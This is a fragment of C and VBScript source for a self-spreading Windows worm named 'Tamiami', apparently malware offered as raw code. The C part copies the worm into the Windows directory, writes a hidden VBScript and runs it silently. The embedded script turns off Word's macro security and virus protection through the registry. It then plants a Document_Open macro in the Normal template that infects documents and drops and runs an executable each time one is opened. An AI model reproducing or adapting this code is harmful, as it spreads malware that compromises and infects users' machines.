		0x20, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x28, 0x22, 0x22, 0x22, 0x22, 0x57, 0x69, 0x6E, 
		0x44, 0x69, 0x72, 0x22, 0x22, 0x22, 0x22, 0x29, 0x20, 0x26, 0x20, 0x22, 0x22, 0x22, 0x22, 0x5C, 
		0x30, 0x30, 0x69, 0x66, 0x55, 0x63, 0x61, 0x6E, 0x43, 0x61, 0x74, 0x63, 0x68, 0x4D, 0x65, 0x2E, 
		0x65, 0x78, 0x65, 0x22, 0x22, 0x22, 0x22, 0x20, 0x46, 0x6F, 0x72, 0x20, 0x42, 0x69, 0x6E, 0x61, 
		0x72, 0x79, 0x20, 0x41, 0x73, 0x20, 0x23, 0x31, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 
		0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x38, 0x2C, 0x20, 0x22, 
		0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x34, 
		0x2C, 0x20, 0x22, 0x22, 0x50, 0x75, 0x74, 0x20, 0x23, 0x31, 0x2C, 0x20, 0x2C, 0x20, 0x54, 0x61, 
		0x6D, 0x69, 0x61, 0x6D, 0x69, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 
		0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x33, 0x39, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 
		0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x35, 0x2C, 0x20, 0x22, 
		0x22, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x20, 0x23, 0x31, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 
		0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x30, 0x2C, 0x20, 
		0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 
		0x36, 0x2C, 0x20, 0x22, 0x22, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x20, 0x45, 0x6E, 0x76, 0x69, 0x72, 
		0x6F, 0x6E, 0x28, 0x22, 0x22, 0x22, 0x22, 0x57, 0x69, 0x6E, 0x44, 0x69, 0x72, 0x22, 0x22, 0x22, 
		0x22, 0x29, 0x20, 0x26, 0x20, 0x22, 0x22, 0x22, 0x22, 0x5C, 0x30, 0x30, 0x69, 0x66, 0x55, 0x63, 
		0x61, 0x6E, 0x43, 0x61, 0x74, 0x63, 0x68, 0x4D, 0x65, 0x2E, 0x65, 0x78, 0x65, 0x22, 0x22, 0x22, 
		0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 
		0x73, 0x20, 0x34, 0x31, 0x2C, 0x20, 0x22, 0x41, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 
		0x69, 0x6E, 0x65, 0x73, 0x20, 0x31, 0x37, 0x2C, 0x20, 0x22, 0x22, 0x45, 0x6E, 0x64, 0x20, 0x53, 
		0x75, 0x62, 0x22, 0x22, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 
		0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x32, 0x2C, 0x20, 0x22, 0x49, 0x66, 0x20, 0x4C, 0x65, 0x66, 
		0x74, 0x28, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 
		0x2E, 0x4E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x32, 0x29, 0x20, 0x3D, 0x20, 0x22, 0x22, 0x44, 0x6F, 
		0x22, 0x22, 0x20, 0x41, 0x6E, 0x64, 0x20, 0x49, 0x73, 0x4E, 0x75, 0x6D, 0x65, 0x72, 0x69, 0x63, 
		0x28, 0x52, 0x69, 0x67, 0x68, 0x74, 0x28, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 
		0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x4E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x31, 0x29, 0x29, 0x20, 
		0x3D, 0x20, 0x54, 0x72, 0x75, 0x65, 0x20, 0x54, 0x68, 0x65, 0x6E, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 
		0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x33, 0x2C, 0x20, 
		0x22, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 
		0x53, 0x61, 0x76, 0x65, 0x64, 0x20, 0x3D, 0x20, 0x54, 0x72, 0x75, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 
		0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x34, 0x2C, 
		0x20, 0x22, 0x45, 0x6C, 0x73, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 
		0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x35, 0x2C, 0x20, 0x22, 0x41, 0x63, 0x74, 0x69, 
		0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x53, 0x61, 0x76, 0x65, 0x41, 
		0x73, 0x20, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x44, 0x6F, 0x63, 0x75, 0x6D, 0x65, 0x6E, 0x74, 
		0x2E, 0x46, 0x75, 0x6C, 0x6C, 0x4E, 0x61, 0x6D, 0x65, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 
		0x73, 0x65, 0x72, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x36, 0x2C, 0x20, 0x22, 0x45, 
		0x6E, 0x64, 0x20, 0x49, 0x66, 0x22, 0x0D, 0x0A, 0x4E, 0x2E, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 
		0x4C, 0x69, 0x6E, 0x65, 0x73, 0x20, 0x34, 0x37, 0x2C, 0x20, 0x22, 0x45, 0x6E, 0x64, 0x20, 0x53, 
		0x75, 0x62, 0x22, 0x0D, 0x0A, 0x57, 0x6F, 0x72, 0x64, 0x2E, 0x51, 0x75, 0x69, 0x74,
	};
	HANDLE			SnapHandle;
	PROCESSENTRY32	ProcessEntry;
	char			WindowsDir[MAX_PATH];
	char			WormFile[MAX_PATH];
	char			Buffer[MAX_PATH];
	HANDLE			FileHandle;
	DWORD			BytesWritten;

	SnapHandle = CreateToolhelp32Snapshot(2, 0);

	if(SnapHandle == 0) return false;
	
	Process32First(SnapHandle, &ProcessEntry);

	do
	{
		CharLowerBuff(ProcessEntry.szExeFile, lstrlen(ProcessEntry.szExeFile));
		if(lstrcmp(ProcessEntry.szExeFile, "winword.exe") == 0) return false;

	}while(Process32Next(SnapHandle, &ProcessEntry));

	CloseHandle(SnapHandle);

	if(GetWindowsDirectory(WindowsDir, sizeof(WindowsDir)) != 0)
	{
		if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
		{
			lstrcpy(Buffer, WindowsDir);
			lstrcat(Buffer, "\\Tamiami.wrd");

			if(CopyFile(WormFile, Buffer, 0) != 0)
			{
				lstrcpy(Buffer, WindowsDir);
				lstrcat(Buffer, "\\Tamiami.vbs");

				FileHandle = CreateFile(Buffer, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

				if(FileHandle != INVALID_HANDLE_VALUE)
				{
					WriteFile(FileHandle, InsertVBS, sizeof(InsertVBS), &BytesWritten, 0);
					CloseHandle(FileHandle);

					if((const int)ShellExecute(0, "open", Buffer, 0, 0, SW_HIDE) > 31) return true;
				}
			}
		}
	}

	return false;
}

/*
On Error Resume Next
Set Word = WScript.CreateObject("Word.Application")
Set Shell = CreateObject("WScript.Shell")
Set N = Word.NormalTemplate.VBProject.VBComponents(1).CodeModule
RegPath = "HKCU\Software\Microsoft\Office\" & Word.Application.Version & "\Word\Security\"
Shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
Shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
Word.Options.VirusProtection = False
Word.Options.ConfirmConversion = False
Word.Options.SaveNormalPrompt = False
N.DeleteLines 1, N.CountOfLines
N.InsertLines 1, "Private Sub Document_Open()"
N.InsertLines 2, "On Error Resume Next"
N.InsertLines 3, "Dim Tamiami As String"
N.InsertLines 4, "Dim Tam1 As String"
N.InsertLines 5, "Dim Tam2 As String"
N.InsertLines 6, "Dim Tam3 As String"
N.InsertLines 7, "Dim Tam4 As String"
N.InsertLines 8, "Options.VirusProtection = False"
N.InsertLines 9, "Options.SaveNormalPrompt = False"
N.InsertLines 10, "Options.ConfirmConversions = False"
N.InsertLines 11, "Open Environ(""WinDir"") & ""\Tamiami.wrd"" For Binary As #1"
N.InsertLines 12, "Tamiami = Space(LOF(1))"
N.InsertLines 13, "Get #1, , Tamiami"
N.InsertLines 14, "Close #1"
N.InsertLines 15, "Tam1 = Left(Tamiami, 49999)"
N.InsertLines 16, "Tam2 = Mid(Tamiami, 50000, 49999)"
N.InsertLines 17, "Tam3 = Mid(Tamiami, 100000, 49999)"
N.InsertLines 18, "Tam4 = Right(Tamiami, 49999)"
N.InsertLines 19, "ActiveDocument.Variables.Add ""Tamiami1"", Tam1"
N.InsertLines 20, "ActiveDocument.Variables.Add ""Tamiami2"", Tam2"
N.InsertLines 21, "ActiveDocument.Variables.Add ""Tamiami3"", Tam3"
N.InsertLines 22, "ActiveDocument.Variables.Add ""Tamiami4"", Tam4"
N.InsertLines 23, "Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule"
N.InsertLines 24, "A.DeleteLines 1, A.CountOfLines"
N.InsertLines 25, "A.InsertLines 1, ""Private Sub Document_Open()"""
N.InsertLines 26, "A.InsertLines 2, ""On Error Resume Next"""
N.InsertLines 27, "A.InsertLines 3, ""Dim Tamiami As String"""
N.InsertLines 28, "A.InsertLines 4, ""Dim Tam1 As String"""
N.InsertLines 29, "A.InsertLines 5, ""Dim Tam2 As String"""
N.InsertLines 30, "A.InsertLines 6, ""Dim Tam3 As String"""
N.InsertLines 31, "A.InsertLines 7, ""Dim Tam4 As String"""
N.InsertLines 32, "A.InsertLines 8, ""Tam1 = ActiveDocument.Variables(""""Tamiami1"""").Value"""
N.InsertLines 33, "A.InsertLines 9, ""Tam2 = ActiveDocument.Variables(""""Tamiami2"""").Value"""
N.InsertLines 34, "A.InsertLines 10, ""Tam3 = ActiveDocument.Variables(""""Tamiami3"""").Value"""
N.InsertLines 35, "A.InsertLines 11, ""Tam4 = ActiveDocument.Variables(""""Tamiami4"""").Value"""
N.InsertLines 36, "A.InsertLines 12, ""Tamiami = Tam1 + Tam2 + Tam3 + Tam4"""
N.InsertLines 37, "A.InsertLines 13, ""Open Environ(""""WinDir"""") & """"\00ifUcanCatchMe.exe"""" For Binary As #1"""
N.InsertLines 38, "A.InsertLines 14, ""Put #1, , Tamiami"""
N.InsertLines 39, "A.InsertLines 15, ""Close #1"""
N.InsertLines 40, "A.InsertLines 16, ""Shell Environ(""""WinDir"""") & """"\00ifUcanCatchMe.exe"""""
N.InsertLines 41, "A.InsertLines 17, ""End Sub"""
N.InsertLines 42, "If Left(ActiveDocument.Name, 2) = ""Do"" And IsNumeric(Right(ActiveDocument.Name, 1)) = True Then"
N.InsertLines 43, "ActiveDocument.Saved = True"
N.InsertLines 44, "Else"
N.InsertLines 45, "ActiveDocument.SaveAs ActiveDocument.FullName"
N.InsertLines 46, "End If"
N.InsertLines 47, "End Sub"
Word.Quit
*/